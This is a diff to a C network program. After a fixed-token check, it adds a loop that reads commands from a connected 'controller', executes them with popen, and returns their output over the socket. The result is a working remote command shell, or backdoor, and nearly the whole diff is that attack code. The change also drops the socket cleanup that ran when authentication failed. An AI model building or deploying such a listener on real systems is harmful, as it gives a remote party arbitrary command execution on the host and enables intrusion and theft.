@@ -49,19 +49,41 @@ int main() {
     }
     printf("Controller connected!\n");
 
-    // --- NEW AUTHENTICATION LOGIC ---
     int valread = read(new_socket, buffer, 1024);
     if (valread > 0) {
-        printf("Received token: %s\n", buffer);
         if (strncmp(buffer, AUTH_TOKEN, 9) == 0) {
-            printf("Authentication successful. Sending confirmation.\n");
+            printf("Authentication successful. Ready for commands.\n");
             send(new_socket, "AUTH_SUCCESS", 12, 0);
+            
+            // --- NEW COMMAND EXECUTION LOGIC ---
+            while (1) {
+                memset(buffer, 0, 1024);
+                int cmd_read = read(new_socket, buffer, 1024);
+                
+                if (cmd_read <= 0 || strncmp(buffer, "exit", 4) == 0) {
+                    printf("Controller disconnected.\n");
+                    break;
+                }
+                
+                printf("Executing: %s\n", buffer);
+                FILE *fp = popen(buffer, "r");
+                if (fp == NULL) {
+                    send(new_socket, "Failed to run command\n", 22, 0);
+                    continue;
+                }
+                
+                char output[4096] = {0};
+                int bytes_read = fread(output, 1, sizeof(output)-1, fp);
+                if (bytes_read > 0) {
+                    send(new_socket, output, bytes_read, 0);
+                } else {
+                    send(new_socket, "(Command executed without output)\n", 34, 0);
+                }
+                pclose(fp);
+            }
         } else {
             printf("Authentication failed. Dropping connection.\n");
             send(new_socket, "AUTH_FAIL", 9, 0);
-            close(new_socket);
-            close(server_fd);
-            return -1;
         }
     }
 
